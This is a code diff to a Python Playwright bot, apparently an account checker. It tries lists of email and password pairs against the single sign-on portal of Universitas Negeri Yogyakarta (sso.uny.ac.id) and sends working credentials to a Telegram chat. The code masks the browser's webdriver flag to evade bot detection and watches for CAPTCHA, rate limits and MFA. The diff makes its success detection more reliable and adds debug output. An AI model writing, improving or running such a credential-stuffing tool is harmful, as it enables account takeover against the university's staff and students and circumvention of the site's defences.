@@ -52,7 +52,7 @@ class SSOCheckerBot:
             Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
         """)
         
-        # Auto-dismiss dialogs (setara alert.accept() di Selenium)
+        # Auto-dismiss dialogs
         self.page.on("dialog", lambda dialog: dialog.accept())
         
         print("✅ Playwright Chromium browser initialized")
@@ -116,20 +116,27 @@ class SSOCheckerBot:
             
             # Clear session
             self.context.clear_cookies()
-            self.page.goto("https://sso.uny.ac.id", wait_until="networkidle", timeout=15000)
             
-            wait_time = random.uniform(1, 2)
-            time.sleep(wait_time)
+            # Navigate ke halaman SSO
+            print(f"[DEBUG] Navigating to sso.uny.ac.id for {email}...")
+            self.page.goto("https://sso.uny.ac.id", timeout=30000)
+            
+            # Tunggu halaman benar-benar load
+            try:
+                self.page.wait_for_load_state("networkidle", timeout=10000)
+            except:
+                pass
+            
+            time.sleep(random.uniform(1, 2))
+            
+            # Debug: cek URL dan ada form atau tidak
+            current_url_before = self.page.url
+            print(f"[DEBUG] Page loaded. URL: {current_url_before}")
             
             # Detect CAPTCHA
             try:
-                captcha_selectors = [
-                    "iframe[src*='recaptcha']",
-                    "iframe[src*='hcaptcha']",
-                    "iframe[src*='captcha']"
-                ]
-                for selector in captcha_selectors:
-                    captcha = self.page.query_selector(selector)
+                for sel in ["iframe[src*='recaptcha']", "iframe[src*='hcaptcha']", "iframe[src*='captcha']"]:
+                    captcha = self.page.query_selector(sel)
                     if captcha and captcha.is_visible():
                         error_msg = "🚨 CAPTCHA terdeteksi! Bot dihentikan."
                         self.bot.send_message(self.chat_id, error_msg)
@@ -144,97 +151,78 @@ class SSOCheckerBot:
                 self.bot.send_message(self.chat_id, error_msg)
                 return False, "Rate limit exceeded"
             
-            # Fill form (mirip Selenium: clear dulu, lalu ketik)
+            # === FILL FORM ===
             try:
-                # Email field - cari dan isi
-                email_field = self.page.query_selector("input[name='username']")
-                if not email_field:
-                    email_field = self.page.query_selector("input[type='text']")
+                # Tunggu form muncul (CRITICAL - ini yang bikin gagal sebelumnya)
+                print(f"[DEBUG] Waiting for username field...")
+                self.page.wait_for_selector("input[name='username']", state="visible", timeout=10000)
+                print(f"[DEBUG] Username field found!")
                 
-                if not email_field:
-                    return False, "Email field tidak ditemukan"
-                
-                # Clear field dulu (seperti Selenium .clear())
-                email_field.click()
-                time.sleep(0.1)
-                self.page.keyboard.press("Control+A")
-                self.page.keyboard.press("Delete")
-                time.sleep(0.1)
-                email_field.type(email, delay=30)
+                # Isi email - pakai page.fill() yang auto-wait
+                self.page.fill("input[name='username']", email)
+                print(f"[DEBUG] Email filled: {email}")
                 time.sleep(0.3)
                 
-                # Password field
-                password_field = self.page.query_selector("input[name='password']")
-                if not password_field:
-                    password_field = self.page.query_selector("input[type='password']")
-                
-                if not password_field:
-                    return False, "Password field tidak ditemukan"
-                
-                password_field.click()
-                time.sleep(0.1)
-                self.page.keyboard.press("Control+A")
-                self.page.keyboard.press("Delete")
-                time.sleep(0.1)
-                password_field.type(password, delay=30)
+                # Isi password
+                self.page.wait_for_selector("input[name='password']", state="visible", timeout=5000)
+                self.page.fill("input[name='password']", password)
+                print(f"[DEBUG] Password filled")
                 time.sleep(0.3)
                 
-                # Click login button
-                login_button = self.page.query_selector("button[type='submit']")
-                if not login_button:
-                    login_button = self.page.query_selector("input[type='submit']")
-                
-                if login_button:
-                    try:
-                        login_button.click()
-                    except:
-                        try:
-                            self.page.evaluate("document.querySelector(\"button[type='submit'], input[type='submit']\").click()")
-                        except:
-                            email_field.press("Enter")
-                else:
-                    # Fallback: submit via Enter
-                    self.page.keyboard.press("Enter")
-                
-                # Wait for response (seperti Selenium time.sleep(2))
-                time.sleep(2)
-                
-                # Tunggu sampai page selesai load
+                # Klik tombol login
+                print(f"[DEBUG] Clicking login button...")
                 try:
-                    self.page.wait_for_load_state("networkidle", timeout=5000)
+                    submit_btn = self.page.wait_for_selector(
+                        "button[type='submit'], input[type='submit']",
+                        state="visible", timeout=5000
+                    )
+                    submit_btn.click()
                 except:
-                    time.sleep(1)
+                    # Fallback: submit via Enter
+                    print(f"[DEBUG] Submit button not found, pressing Enter...")
+                    self.page.press("input[name='password']", "Enter")
                 
-                # Dismiss alerts / popups
+                print(f"[DEBUG] Login submitted, waiting for response...")
+                
+                # Tunggu navigasi/response (CRITICAL - harus cukup lama)
+                time.sleep(3)
+                
+                # Tunggu halaman selesai load
+                try:
+                    self.page.wait_for_load_state("networkidle", timeout=10000)
+                except:
+                    time.sleep(2)
+                
+                print(f"[DEBUG] Page after login. URL: {self.page.url}")
+                
+                # Dismiss alerts/popups
                 try:
                     self.page.keyboard.press("Escape")
                     time.sleep(0.2)
                 except:
                     pass
                 
-                # Klik tombol OK jika ada modal
+                # Klik OK jika ada modal
                 try:
-                    ok_buttons = self.page.query_selector_all("button")
-                    for btn in ok_buttons:
-                        try:
-                            text = btn.inner_text().strip()
-                            if text in ['OK', 'Ok', 'ok']:
-                                if btn.is_visible():
-                                    btn.click()
-                                    time.sleep(1)
-                                    break
-                        except:
-                            continue
+                    ok_btn = self.page.query_selector("button:has-text('OK')")
+                    if ok_btn and ok_btn.is_visible():
+                        ok_btn.click()
+                        time.sleep(1)
                 except:
                     pass
                 
-                # Check result
+                # === CHECK RESULT ===
                 current_url = self.page.url
                 page_source = self.page.content().lower()
                 
-                # ** CRITICAL: Check MFA FIRST before success validation **
+                print(f"[DEBUG] Checking result...")
+                print(f"[DEBUG] URL before: {current_url_before}")
+                print(f"[DEBUG] URL after:  {current_url}")
+                
+                # ** Check MFA FIRST **
                 mfa_detected, mfa_reason = self.detect_mfa()
                 if mfa_detected:
+                    print(f"[DEBUG] MFA detected: {mfa_reason}")
                     return False, f"MFA/2FA required ({mfa_reason})"
                 
                 # Fail indicators
@@ -245,67 +233,95 @@ class SSOCheckerBot:
                     "couldn't sign you in", 'hubungi admin domain'
                 ]
                 
-                # Success indicators (hanya yang spesifik post-login)
+                # Check fail keywords FIRST
+                for keyword in fail_keywords:
+                    if keyword in page_source:
+                        print(f"[DEBUG] FAIL keyword found: {keyword}")
+                        return False, f"Autentikasi gagal: {keyword}"
+                
+                # Check Google error page
+                if 'accounts.google.com' in current_url and ('error' in current_url.lower() or 'signin' in current_url.lower()):
+                    print(f"[DEBUG] Google error page detected")
+                    return False, "Google error page"
+                
+                # Cek apakah masih ada form login (berarti belum berhasil login)
+                login_form_exists = self.page.query_selector("input[name='username']") is not None
+                print(f"[DEBUG] Login form still exists: {login_form_exists}")
+                
+                # Success indicators
                 success_keywords = [
                     'dashboard', 'logout', 'beranda',
                     'berhasil', 'selamat',
                     'sign out', 'keluar'
                 ]
                 
-                # SSO UNY success markers (TANPA 'single sign on uny' karena ada di halaman login!)
+                # SSO UNY specific markers (post-login page)
                 sso_success_markers = [
                     'berhasil masuk', 'selamat datang',
                     'webmail', 'siakad', 'besmart'
                 ]
                 
-                # Check Google error page
-                if 'accounts.google.com' in current_url and ('error' in current_url.lower() or 'signin' in current_url.lower()):
-                    return False, "Google error page"
-                
-                # Check fail keywords FIRST
-                for keyword in fail_keywords:
-                    if keyword in page_source:
-                        return False, f"Autentikasi gagal: {keyword}"
-                
-                # Cek apakah masih ada form login di halaman (berarti BELUM login)
-                login_form_exists = (
-                    self.page.query_selector("input[name='username']") is not None
-                    and self.page.query_selector("input[name='password']") is not None
-                )
-                
                 # Check SSO success markers
                 marker_hits = [m for m in sso_success_markers if m in page_source]
-                if len(marker_hits) >= 2:
-                    return True, f"Login berhasil (SSO: {marker_hits[0]})"
+                if len(marker_hits) >= 1 and not login_form_exists:
+                    print(f"[DEBUG] SUCCESS - SSO markers: {marker_hits}")
+                    return True, f"Login berhasil (SSO: {', '.join(marker_hits)})"
                 
-                # Check success keywords
+                # Check success keywords in page
                 for keyword in success_keywords:
-                    if keyword in page_source:
-                        # Pastikan bukan masih di halaman login
-                        if not login_form_exists:
-                            return True, f"Login berhasil: {keyword}"
+                    if keyword in page_source and not login_form_exists:
+                        print(f"[DEBUG] SUCCESS - keyword in page: {keyword}")
+                        return True, f"Login berhasil: {keyword}"
                 
-                # Check URL-based success (bukan di halaman login lagi)
-                if keyword in current_url.lower():
-                    for kw in success_keywords:
-                        if kw in current_url.lower():
-                            return True, f"Login berhasil (URL): {kw}"
+                # Check success keywords in URL
+                for keyword in success_keywords:
+                    if keyword in current_url.lower():
+                        print(f"[DEBUG] SUCCESS - keyword in URL: {keyword}")
+                        return True, f"Login berhasil (URL): {keyword}"
                 
-                # Check redirect (hanya jika form login sudah tidak ada)
-                if not login_form_exists:
-                    if current_url != "https://sso.uny.ac.id" and 'google.com' not in current_url and 'sso.uny.ac.id' not in current_url:
-                        return True, "Login berhasil (redirect)"
+                # URL changed = kemungkinan berhasil redirect
+                url_changed = (current_url.rstrip('/') != current_url_before.rstrip('/'))
                 
-                # Still at login page
-                if login_form_exists or 'sso.uny.ac.id' in current_url or 'login' in current_url.lower():
+                if url_changed and not login_form_exists:
+                    # URL berubah DAN form login sudah tidak ada
+                    if 'sso.uny.ac.id' not in current_url and 'google.com' not in current_url:
+                        print(f"[DEBUG] SUCCESS - redirected to: {current_url}")
+                        return True, f"Login berhasil (redirect ke {current_url})"
+                    
+                    # Masih di domain SSO tapi bukan halaman login
+                    if 'sso.uny.ac.id' in current_url:
+                        # Cek apakah sudah di halaman dashboard SSO
+                        if any(m in page_source for m in sso_success_markers):
+                            print(f"[DEBUG] SUCCESS - SSO dashboard")
+                            return True, "Login berhasil (SSO dashboard)"
+                
+                # Masih di halaman login
+                if login_form_exists:
+                    print(f"[DEBUG] FAIL - still at login page")
                     return False, "Masih di halaman login"
                 
-                return False, "Tidak ada indikator sukses"
+                # URL tidak berubah
+                if not url_changed:
+                    print(f"[DEBUG] FAIL - URL didn't change")
+                    return False, "Masih di halaman login (URL tidak berubah)"
+                
+                # Jika sampai sini: URL berubah tapi tidak jelas hasilnya
+                # Anggap gagal untuk menghindari false positive
+                print(f"[DEBUG] UNCERTAIN - URL: {current_url}")
+                return False, f"Tidak ada indikator sukses (URL: {current_url})"
                 
             except Exception as e:
-                return False, f"Element tidak ditemukan: {str(e)}"
+                print(f"[DEBUG] EXCEPTION during form fill: {str(e)}")
+                # Coba screenshot untuk debug
+                try:
+                    self.page.screenshot(path=f"/tmp/debug_{index}.png")
+                    print(f"[DEBUG] Screenshot saved: /tmp/debug_{index}.png")
+                except:
+                    pass
+                return False, f"Error: {str(e)}"
         
         except Exception as e:
+            print(f"[DEBUG] EXCEPTION during check_login: {str(e)}")
             return False, str(e)
     
     def start_checking(self):
@@ -320,6 +336,8 @@ class SSOCheckerBot:
             for idx, (email, password) in enumerate(self.credentials, 1):
                 success, message = self.check_login(email, password, idx, total)
                 
+                print(f"[RESULT] {email}: {'SUCCESS' if success else 'FAIL'} - {message}")
+                
                 if success:
                     self.success_list.append((email, password, message))
                     
@@ -328,6 +346,13 @@ class SSOCheckerBot:
                     self.bot.send_message(self.chat_id, success_msg, parse_mode='Markdown')
                 else:
                     self.failed_list.append((email, password, message))
+                    
+                    # Kirim alasan gagal ke user (untuk debugging)
+                    fail_msg = f"❌ *[{idx}/{total}]* `{email}`\n_{message}_"
+                    try:
+                        self.bot.send_message(self.chat_id, fail_msg, parse_mode='Markdown')
+                    except:
+                        pass
                     
                     # Stop if CAPTCHA or rate limit
                     if 'CAPTCHA' in message or 'Rate limit' in message:
